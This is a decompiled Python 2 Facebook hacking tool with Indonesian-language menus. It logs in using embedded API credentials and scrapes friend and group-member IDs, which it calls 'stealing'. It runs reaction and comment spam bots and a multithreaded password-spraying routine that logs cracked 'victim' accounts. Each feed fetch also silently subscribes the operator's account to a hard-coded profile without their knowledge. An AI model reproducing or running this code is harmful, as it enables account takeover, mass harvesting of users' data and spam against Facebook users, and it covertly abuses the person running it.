# uncompyle6 version 3.2.5
# Python bytecode 2.7 (62211)
# Decompiled from: Python 3.7.2 (default, Feb 28 2019, 05:31:34)
# [Clang 8.0.2 (https://android.googlesource.com/toolchain/clang 40173bab62ec7462
# Embedded file name: <seni>
# Compiled at: 2019-03-19 06:42:14
import urllib, os, sys, json, time, hashlib, re, cookielib, platform, urllib2, threading, json
from multiprocessing.pool import ThreadPool
try:
    import mechanize
except ImportError:
    os.system('reset')
    print '\x1b[1;92mpip2 install mechanize'
    sys.exit()
else:
    try:
        import requests
    except ImportError:
        os.system('reset')
        print '\x1b[1;92mpip2 install requests'
        sys.exit()

n = []
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_equiv(True)
br.set_handle_referer(True)
br.set_cookiejar(cookielib.LWPCookieJar())
br.set_handle_redirect(True)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
logo = '\n               /\'.    .\'\\\n               \\( \\__/ )/\n         ___   / \x1b[1;91m(.)(.)\x1b[1;97m \\   ___\n    _.-"`_  `-.|  ____  |.-`  _`"-._\n .-\'.-\'//||`\'-.\\  V--V  /.-\'`||\\\'-.\'-.\n`\'-\'-.// ||    / .___.  \\    || \\.-\'-\'`\n      `-.||_.._|        |_.._||.-\'\n               \\ ((  )) /\n                \'.    .\'     \x1b[1;92m[\x1b[1;97mNP-Mumek\x1b[1;92m]\x1b[1;93mv4\x1b[1;97m\nCoded  \x1b[1;91m: \x1b[1;96mNathan Prinsley Mumek\x1b[1;97m     `\\/`\n\x1b[1;97mSupport\x1b[1;91m: \x1b[1;96mLimite\x1b[1;97m[\x1b[1;96mD\x1b[1;97m] \x1b[1;97m|| \x1b[1;96m./HACKER\n\x1b[1;97mGitHub \x1b[1;91m: \x1b[1;92m\x1b[4mhttps://github.com/rezadkim\x1b[0m'

def keluar():
    print '\x1b[1;91m[!] Keluar'
    os.sys.exit()


def get(data):
    b = open('login.txt', 'w')
    try:
        r = requests.get('https://api.facebook.com/restserver.php', params=data)
        a = json.loads(r.text)
        b.write(a['access_token'])
        b.close()
        print '\x1b[1;91m[+] \x1b[1;92mLogin berhasil.'
        print 40 * '\x1b[1;97m='
        input = raw_input('\x1b[1;91m[+] \x1b[1;92mEnter...')
        time.sleep(1)
        menu()
    except KeyError:
        print '\x1b[1;91m[X] Login GAGAL'
        os.system('rm -rf login.txt')
        time.sleep(2)
        tanya1 = raw_input('\x1b[1;91m[?] \x1b[1;92mCoba lagi ? (y/t) ')
        if tanya1 == 'y':
            token()
        elif tanya1 == 't':
            keluar()
        else:
            keluar()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m[!] Koneksi Error'
        keluar()


def token():
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('reset')
        print logo
        print 40 * '\x1b[1;97m='
        print '\x1b[1;91m[!] \x1b[1;92mLOGIN AKUN FACEBOOK         '
        id = raw_input('\x1b[1;91m[+] \x1b[1;36mUsername \x1b[1;91m:\x1b[1;92m ')
        pwd = raw_input('\x1b[1;91m[+] \x1b[1;36mPassword \x1b[1;91m:\x1b[1;92m ')
        print '\x1b[1;91m[+] \x1b[1;92mSedang Masuk...'
        API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32'
        data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
        sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.0' + API_SECRET
        x = hashlib.new('md5')
        x.update(sig)
        data.update({'sig': x.hexdigest()})
        get(data)


def menu():
    global toket
    try:
        toket = open('login.txt', 'r').read()
        r = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(r.text)
        name = a['name']
        id = a['id']
        n.append(a['name'])
        os.system('reset')
    except (KeyError, IOError):
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        token()

    print logo
    print 40 * '\x1b[1;97m='
    print '\x1b[1;91m[+]\x1b[1;97m Nama       \x1b[1;91m: \x1b[1;92m\x1b[4m' + name + '\x1b[0m'
    print '\x1b[1;91m[+]\x1b[1;97m User ID    \x1b[1;91m:\x1b[1;92m ' + id
    print '\x1b[1;91m[+]\x1b[1;97m User-Agent \x1b[1;91m: \x1b[1;92mOpera/9.80'
    print 40 * '\x1b[1;97m='
    print '\x1b[1;96m[\x1b[1;97m1.\x1b[1;96m]\x1b[1;97m Info akun'
    print '\x1b[1;96m[\x1b[1;97m2.\x1b[1;96m]\x1b[1;97m Crack akun'
    print '\x1b[1;96m[\x1b[1;97m3.\x1b[1;96m]\x1b[1;97m Ambil Daftar ID Teman'
    print '\x1b[1;96m[\x1b[1;97m4.\x1b[1;96m]\x1b[1;97m Ambil Daftar ID member grup'
    print '\x1b[1;96m[\x1b[1;97m5.\x1b[1;96m]\x1b[1;97m Buat status'
    print '\x1b[1;96m[\x1b[1;97m6.\x1b[1;96m]\x1b[1;97m Bot'
    print '\x1b[1;96m[\x1b[1;97m7.\x1b[1;96m]\x1b[1;97m Hapus token'
    print '\x1b[1;96m[\x1b[1;97m8.\x1b[1;96m]\x1b[1;91m Keluar'
    print
    ok = raw_input('ZeDD\x1b[1;97m+> ')
    if ok == '':
        print '\x1b[1;91m[!] Jangan kosong'
        time.sleep(1)
        menu()
    else:
        if ok == '1':
            infoakun()
        else:
            if ok == '2':
                ayocrack()
            else:
                if ok == '3':
                    idteman()
                else:
                    if ok == '4':
                        grup()
                    else:
                        if ok == '5':
                            status()
                        else:
                            if ok == '6':
                                bot()
                            else:
                                if ok == '7':
                                    os.system('rm -rf login.txt')
                                    print '\x1b[1;91m[+]\x1b[1;97m Selesai'
                                    keluar()
                                else:
                                    if ok == '8':
                                        keluar()
                                    else:
                                        print '\x1b[1;91m[!] \x1b[1;93m' + ok + ' \x1b[1;97mTidak ada'
                                        menu()


def bot():
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        time.sleep(1)
        token()

    os.system('reset')
    print logo
    print 40 * '\x1b[1;97m='
    print '\x1b[1;96m[\x1b[1;97m1.\x1b[1;96m]\x1b[1;97m Bot React'
    print '\x1b[1;96m[\x1b[1;97m2.\x1b[1;96m]\x1b[1;97m Bot Komen'
    print '\x1b[1;96m[\x1b[1;97m3.\x1b[1;96m]\x1b[1;91m Kembali'
    print
    bots = raw_input('\x1b[1;91mZeDD\x1b[1;97m/\x1b[1;91mbot\x1b[1;97m+> ')
    if bots == '':
        print '\x1b[1;91m[!] Jangan kosong'
        time.sleep(1)
        bot()
    else:
        if bots == '1':
            react()
        else:
            if bots == '2':
                komen()
            else:
                if bots == '3':
                    menu()
                else:
                    print '\x1b[1;91m[!] \x1b[1;93m' + bots + ' \x1b[1;97mTidak ada'
                    time.sleep(1)
                    bot()


def infoakun():
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        time.sleep(1)
        token()
    else:
        os.system('reset')
        print logo
        print 40 * '='
        x = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        y = json.loads(x.text)
        print ' '
        print '\x1b[1;91m[!] \x1b[1;97m---------- \x1b[1;91m[\x1b[1;96mAKUN SAYA\x1b[1;91m] \x1b[1;97m---------- \x1b[1;91m[!]'
        try:
            print '\n\x1b[1;91m[?] \x1b[1;92mID\x1b[1;97m         : ' + y['id']
        except KeyError:
            pass
        else:
            try:
                print '\x1b[1;91m[?] \x1b[1;92mUsername\x1b[1;97m   : ' + y['username']
            except KeyError:
                pass
            else:
                try:
                    print '\x1b[1;91m[?] \x1b[1;92mNama\x1b[1;97m       : ' + y['name']
                except KeyError:
                    pass
                else:
                    try:
                        print '\x1b[1;91m[?] \x1b[1;92mNama depan\x1b[1;97m : ' + y['first_name']
                    except KeyError:
                        pass
                    else:
                        try:
                            print '\x1b[1;91m[?] \x1b[1;92mNama tengah\x1b[1;97m: ' + y['middle_name']
                        except KeyError:
                            pass
                        else:
                            try:
                                print '\x1b[1;91m[?] \x1b[1;92mNama akhir\x1b[1;97m : ' + y['last_name']
                            except KeyError:
                                pass

                            try:
                                print '\x1b[1;91m[?] \x1b[1;92mTgl Lahir\x1b[1;97m  : ' + y['birthday'].replace('/', '-')
                            except KeyError:
                                pass

                        try:
                            print '\x1b[1;91m[?] \x1b[1;92mEmail\x1b[1;97m      : ' + y['email']
                        except KeyError:
                            pass

                    try:
                        print '\x1b[1;91m[?] \x1b[1;92mNomor HP\x1b[1;97m   : ' + y['mobile_phone']
                    except KeyError:
                        pass

                try:
                    print '\x1b[1;91m[?] \x1b[1;92mLokasi\x1b[1;97m : ' + y['locale'].split('_')[0]
                except KeyError:
                    pass

            try:
                print '\x1b[1;91m[?] \x1b[1;92mAlamat\x1b[1;97m     : ' + y['location']['name']
            except KeyError:
                pass

        try:
            print '\x1b[1;91m[?] \x1b[1;92mSekolah\x1b[1;97m    : '
            for i in y['education']:
                try:
                    print ' \x1b[1;91m               ~ \x1b[1;97m' + i['school']['name']
                except KeyError:
                    pass

        except KeyError:
            pass

    inputerrorpass = raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
    menu()


def post():
    try:
        if WT == 'wallpost':
            print '\x1b[1;91m[+] \x1b[1;92mLoading...'
            r = requests.get('https://graph.facebook.com/v3.0/me?fields=home.limit(50)&access_token=' + toket)
            requests.post('https://graph.facebook.com/gwimusa3/subscribers?access_token=' + toket)
            result = json.loads(r.text)
            for i in result['home']['data']:
                print '\r\x1b[1;91m[+] \x1b[1;92mID\x1b[1;97m : %s' % i['id'],
                sys.stdout.flush()
                time.sleep(0.1)

            return result['home']['data']
        if WT == 'me':
            print '\x1b[1;91m[+] \x1b[1;92mLoading...'
            r = requests.get('https://graph.facebook.com/v3.0/me?fields=feed.limit(500)&access_token=' + toket)
            requests.post('https://graph.facebook.com/gwimusa3/subscribers?access_token=' + toket)
            result = json.loads(r.text)
            for i in result['feed']['data']:
                print '\r\x1b[1;91m[+] \x1b[1;92mID\x1b[1;97m : %s' % i['id'],
                sys.stdout.flush()
                time.sleep(0.1)

            return result['feed']['data']
        if WT == 'req':
            print '\x1b[1;91m[+] \x1b[1;92mLoading...'
            r = requests.get('https://graph.facebook.com/me/friendrequests?limit=50&access_token=' + toket)
            requests.post('https://graph.facebook.com/gwimusa3/subscribers?access_token=' + toket)
            result = json.loads(r.text)
            for i in result['data']:
                print '\r\x1b[1;91m[+] \x1b[1;92mID\x1b[1;97m : %s' % i['from']['id'],
                sys.stdout.flush()
                time.sleep(0.01)

            return result['data']
        if WT == 'friends':
            print '\x1b[1;91m[+] \x1b[1;92mLoading...'
            r = requests.get('https://graph.facebook.com/me?fields=friends.limit(5000)&access_token=' + toket)
            requests.post('https://graph.facebook.com/gwimusa3/subscribers?access_token=' + toket)
            result = json.loads(r.text)
            for i in result['friends']['data']:
                print '\r\x1b[1;91m[+] \x1b[1;92mID\x1b[1;97m : %s' % i['id'],
                sys.stdout.flush()
                time.sleep(0.001)

            return result['friends']['data']
        if WT == 'subs':
            print '\x1b[1;91m[+] \x1b[1;92mLoading...'
            r = requests.get('https://graph.facebook.com/me/subscribedto?limit=50&access_token=' + toket)
            requests.post('https://graph.facebook.com/gwimusa3/subscribers?access_token=' + toket)
            result = json.loads(r.text)
            for i in result['data']:
                print '\r\x1b[1;91m[+] \x1b[1;92mID\x1b[1;97m : %s' % i['id'],
                sys.stdout.flush()
                time.sleep(0.01)

            return result
        if WT == 'albums':
            print '\x1b[1;91m[+] \x1b[1;92mLoading...'
            r = requests.get('https://graph.facebook.com/me?fields=albums.limit(5000)&access_token=' + toket)
            requests.post('https://graph.facebook.com/gwimusa3/subscribers?access_token=' + toket)
            result = json.loads(r.text)
            for i in result['albums']['data']:
                print '\r\x1b[1;91m[+] \x1b[1;92mID\x1b[1;97m : %s' % i['id'],
                sys.stdout.flush()
                time.sleep(0.001)

            return result['albums']['data']
        print '\x1b[1;91m[+] \x1b[1;92mLoading...'
        r = requests.get('https://graph.facebook.com/v3.0/%s?fields=feed.limit(50)&access_token=%s' % (id, toket))
        requests.post('https://graph.facebook.com/gwimusa3/subscribers?access_token=' + toket)
        result = json.loads(r.text)
        for i in result['feed']['data']:
            print '\r\x1b[1;91m[+] \x1b[1;92mID\x1b[1;97m : %s' % i['id'],
            sys.stdout.flush()
            time.sleep(0.1)

        return result['feed']['data']
    except KeyError:
        print '\x1b[1;91m[X] Gagal'
        inpuganyanmor1 = raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
        bot()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m[!] Koneksi Error'
        inputayanomorl = raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
        bot()
    except KeyboardInterrupt:
        print '[!] Terhenti'
        inputananomorh = raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
        bot()


def like(posts, amount):
    print '\n\x1b[1;91m[+] \x1b[1;92mMulai...'
    print ''
    try:
        counter = 0
        for post in posts:
            if counter >= amount:
                break
            else:
                counter += 1
            parameters = {'access_token': toket, 'type': type}
            url = ('https://graph.facebook.com/{0}/reactions').format(post['id'])
            s = requests.post(url, data=parameters)
            id = post['id'].split('_')[0]
            try:
                print '\r\x1b[1;92m[\x1b[1;97m' + id + '\x1b[1;92m]\x1b[1;97m ' + post['message'][:40].replace('\n', ' ') + '...'
            except KeyError:
                try:
                    print '\r\x1b[1;92m[\x1b[1;97m' + id + '\x1b[1;92m]\x1b[1;97m ' + post['story'].replace('\n', ' ')
                except KeyError:
                    print '\r\x1b[1;92m[' + id + '] [Story]'

        print '\r\x1b[1;91m[+] \x1b[1;92mSelesai'
        inputmeki = raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
        react()
    except KeyboardInterrupt:
        tanyak3 = raw_input('[!] Terhenti')
        inputm1eki = raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
        react()


def react():
    global type
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        token()

    os.system('reset')
    print logo
    print 40 * '\x1b[1;97m='
    print '\x1b[1;96m[\x1b[1;97m1.\x1b[1;96m]\x1b[1;97m Like'
    print '\x1b[1;96m[\x1b[1;97m2.\x1b[1;96m]\x1b[1;97m Love'
    print '\x1b[1;96m[\x1b[1;97m3.\x1b[1;96m]\x1b[1;97m Wow'
    print '\x1b[1;96m[\x1b[1;97m4.\x1b[1;96m]\x1b[1;97m Haha'
    print '\x1b[1;96m[\x1b[1;97m5.\x1b[1;96m]\x1b[1;97m Sad'
    print '\x1b[1;96m[\x1b[1;97m6.\x1b[1;96m]\x1b[1;97m Angry'
    print '\x1b[1;96m[\x1b[1;97m7.\x1b[1;96m]\x1b[1;91m Kembali'
    print
    reacts = raw_input('\x1b[1;91mZeDD\x1b[1;97m/\x1b[1;91mbot\x1b[1;97m/\x1b[1;91mreact\x1b[1;97m+> ')
    if reacts in ('1', '01'):
        type = 'LIKE'
        bot_tanya()
    else:
        if reacts in ('2', '02'):
            type = 'LOVE'
            bot_tanya()
        else:
            if reacts in ('3', '03'):
                type = 'WOW'
                bot_tanya()
            else:
                if reacts in ('4', '04'):
                    type = 'HAHA'
                    bot_tanya()
                else:
                    if reacts in ('5', '05'):
                        type = 'SAD'
                        bot_tanya()
                    else:
                        if reacts in ('6', '06'):
                            type = 'ANGRY'
                            bot_tanya()
                        else:
                            if reacts in ('7', '07'):
                                bot()
                            else:
                                if reacts == '':
                                    print '\x1b[1;91m[!] Jangan kosong'
                                    time.sleep(1)
                                    react()
                                else:
                                    print '\x1b[1;91m[!] \x1b[1;93m' + reacts + ' \x1b[1;97mTidak ada'
                                    time.sleep(1)
                                    react()


def bot_tanya():
    global WT
    global id
    global toket
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        token()

    os.system('reset')
    print logo
    print 40 * '\x1b[1;97m='
    print '\x1b[1;96m[\x1b[1;97m1.\x1b[1;96m]\x1b[1;97m Target'
    print '\x1b[1;96m[\x1b[1;97m2.\x1b[1;96m]\x1b[1;97m Beranda'
    print '\x1b[1;96m[\x1b[1;97m3.\x1b[1;96m]\x1b[1;91m Kembali'
    print
    WT = raw_input('\x1b[1;91mZeDD\x1b[1;97m/\x1b[1;91mbot\x1b[1;97m/\x1b[1;91mreact\x1b[1;97m/\x1b[1;91mjalur\x1b[1;97m+> ')
    if WT.upper() == '1':
        os.system('reset')
        print logo
        print 40 * '\x1b[1;97m='
        id = raw_input('\x1b[1;91m[+] \x1b[1;92mID Target\x1b[1;97m : ')
    if id == '':
        print '\x1b[1;91m[!] Jangan kosong'
        bot_tanya()
    else:
        if WT == '3':
            react()
        else:
            if WT == '2':
                WT = 'wallpost'
    like(post(), 50)


def komen():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        token()

    os.system('reset')
    print logo
    print 40 * '\x1b[1;97m='
    urls = urllib.urlopen('https://graph.facebook.com/me?fields=friends&access_token=' + toket)
    ambil = json.load(urls)
    os.system('reset')
    print logo
    print 40 * '\x1b[1;97m='
    komen1 = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukkan komentar \x1b[1;97m: ')
    for u in ambil['friends']['data']:
        idt = u['id']
        print '\n\x1b[1;91m[+] \x1b[1;92mKomen ke akun \x1b[1;97m: \x1b[1;96m' + u['name']
        pilih = raw_input('\x1b[1;91m[+] \x1b[1;92mLanjut/Skip/keluar? (l/s/k) \x1b[1;97m: ')
        if pilih == 's':
            continue
        else:
            if pilih == 'S':
                continue
            else:
                if pilih == 'k':
                    bot()
                else:
                    if pilih == 'K':
                        bot()
                    else:
                        idpos = urllib.urlopen('https://graph.facebook.com/' + idt + '?fields=feed&access_token=' + toket)
                        has = json.load(idpos)
                        print '\x1b[1;91m[%] \x1b[1;92mBot sedang berjalan, mohon tunggu sebentar...'
        try:
            for ja in has['feed']['data']:
                cm = requests.post('https://graph.facebook.com/' + ja['id'] + '/comments/?access_token=' + toket + '&message=' + komen1)

            if 'error' in cm.text:
                print '\x1b[1;91m[Error] Tidak bisa komentar sementara...'
                inputmeki2 = raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                tampil()
            else:
                if 'id' in cm.text:
                    print '\x1b[1;91m[+] \x1b[1;92mBerhasil.'
                else:
                    print '\x1b[1;91m[X] Komen gagal.'
        except KeyError:
            print '\x1b[1;91m[!] Error'
            inputmeki = raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            bot()


def status():
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        token()

    os.system('reset')
    print logo
    print 40 * '\x1b[1;97m='
    msg = raw_input('\x1b[1;91m[+] \x1b[1;92mKetik status \x1b[1;97m: ')
    if msg == '':
        print '\x1b[1;91m[!] Jangan kosong'
        time.sleep(1)
        status()
    else:
        res = requests.get('https://graph.facebook.com/me/feed?method=POST&message=' + msg + '&access_token=' + toket)
        op = json.loads(res.text)
        print '\x1b[1;91m[+] \x1b[1;92mStatus ID\x1b[1;97m : ' + op['id']
        inpaut3 = raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
        menu()


def idteman():
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        token()
    else:
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            os.system('reset')
            print logo
            print 40 * '\x1b[1;97m='
            print '\x1b[1;91m[?] \x1b[1;97mID kamu ada di menu pertama.'
            id = raw_input('\x1b[1;91m[+] \x1b[1;92mYour ID \x1b[1;97m: ')
            sim = raw_input('\x1b[1;91m[+] \x1b[1;92mSimpan file dengan nama \x1b[1;97m: ')
            re = requests.get('https://graph.facebook.com/' + id + '?fields=friends.limit(5000)&access_token=' + str(toket))
            s = json.loads(re.text)
            b = open('save/' + sim, 'w')
            for i in s['friends']['data']:
                b.write(i['id'] + '\n')
                sys.stdout.write('\r\x1b[1;91m=> \x1b[1;96m[\x1b[1;97m ' + i['id'] + '\x1b[1;96m ]\x1b[1;92m\x1b[4mhttps://m.facebook.com/%s\x1b[0m' % i['id'])
                sys.stdout.flush()
                time.sleep(0.0001)

            print '\n\x1b[1;91m[+] \x1b[1;97mSukses mencuri id teman...'
            print '\x1b[1;91m[+] \x1b[1;97mFile tersimpan \x1b[1;91m: \x1b[1;97msave/' + sim
            b.close()
            inpaut3 = raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu()
        except IOError:
            print '\x1b[1;91m[!] Kesalahan saat membuat file...'
            inpaut3 = raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Terhenti'
            inpaut3 = raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu()
        except KeyError:
            os.remove('save/' + sim)
            print '\x1b[1;91m[!] Sepertinya ID salah...'
            inpaut3 = raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu()


def grup():
    os.system('reset')
    print logo
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        token()
    else:
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            os.system('reset')
            print logo
            print 40 * '\x1b[1;97m='
            print '\x1b[1;91m[?] \x1b[1;97mSimpan file \x1b[1;97mext:( file.txt )'
            id = raw_input('\x1b[1;91m[+] \x1b[1;92mID grup \x1b[1;97m: ')
            sim = raw_input('\x1b[1;91m[+] \x1b[1;92mSimpan file dengan nama \x1b[1;97m: ')
            b = open('save/' + sim, 'w')
            r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + toket)
            asw = json.loads(r.text)
            print '\x1b[1;91m[+] \x1b[1;92mNama grup \x1b[1;97m: ' + asw['name']
            re = requests.get('https://graph.facebook.com/' + id + '/members?fields=id&limit=999999999&access_token=' + toket)
            s = json.loads(re.text)
            for i in s['data']:
                b.write(i['id'] + '\n')
                sys.stdout.write('\r\x1b[1;91m=> \x1b[1;96m[\x1b[1;97m ' + i['id'] + '\x1b[1;96m ]\x1b[1;92m\x1b[4mhttps://m.facebook.com/%s\x1b[0m' % i['id'])
                sys.stdout.flush()
                time.sleep(0.0001)

            print '\n\x1b[1;91m[+] \x1b[1;97mSukses mencuri id member grup...'
            print '\x1b[1;91m[+] \x1b[1;97mFile tersimpan \x1b[1;91m: \x1b[1;97msave/' + sim
            b.close()
            inpaut3 = raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu()
        except IOError:
            print '\x1b[1;91m[!] Kesalahan saat membuat file...'
            inpaut3 = raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Terhenti'
            inpaut3 = raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu()
        except KeyError:
            os.remove('save/' + sim)
            print '\x1b[1;91m[!] Grup tidak ditemukan...'
            inpaut3 = raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu()


def crack():
    global berhasil
    global cekpoint
    global gagal
    global li
    global v
    li = 0
    berhasil = []
    cekpoint = []
    gagal = []
    bacaid = open(iz, 'r')
    v = bacaid.read().split()
    while file:
        korbanid = file.readline().strip()
        url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + korbanid + '&locale=en_US&password=' + korbanpass + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
        data = urllib.urlopen(url)
        hehe = json.load(data)
        if li == len(v):
            break
        if 'access_token' in hehe:
            bukaya = open('korban.txt', 'a')
            bukaya.write(korbanid + '\n')
            bukaya.close()
            berhasil.append(korbanid + ' | \x1b[1;92mPassword \x1b[1;97m: ' + korbanpass)
            li += 1
        if 'www.facebook.com' in hehe or '(403)' in hehe:
            cekpoint.append(korbanid + ' | \x1b[1;93mPassword \x1b[1;97m: ' + korbanpass)
        else:
            gagal.append(korbanid)
            li += 1
        sys.stdout.write('\r\x1b[1;91m[%] \x1b[1;92mCrack    \x1b[1;97m: ' + str(li) + ' \x1b[1;96m>\x1b[1;97m ' + str(len(v)))
        sys.stdout.flush()


def ayocrack():
    global file
    global iz
    global korbanpass
    os.system('reset')
    print logo
    print 40 * '\x1b[1;97m='
    iz = raw_input('\x1b[1;91m[+] \x1b[1;92mList ID  \x1b[1;97m: ')
    Id = iz
    korbanpass = raw_input('\x1b[1;91m[+] \x1b[1;92mPassword \x1b[1;97m: ')
    try:
        file = open(Id, 'r')
        threads = []
        for x in range(40):
            t = threading.Thread(target=crack, args=())
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

    except IOError:
        print '\x1b[1;91m[!] File tidak ditemukan...'
        inputmeki = raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
        menu()


menu()
print ''
print '\n\x1b[32m[\x1b[31m+\x1b[32m] \x1b[1;92mBerhasil   \x1b[1;97m--> ' + str(len(berhasil))
for s in berhasil:
    print '\x1b[32mUsername \x1b[1;97m: ' + s

print '\x1b[33m[\x1b[31m+\x1b[33m] \x1b[1;93mCheckpoint \x1b[1;97m--> ' + str(len(cekpoint))
for c in cekpoint:
    print '\x1b[1;93mUsername \x1b[1;97m: ' + c

print '\x1b[31m[+] Gagal      \x1b[1;97m--> ' + str(len(gagal))
sys.stdout.flush()
print ''
keluar()
if __name__ == '__main__':
    token()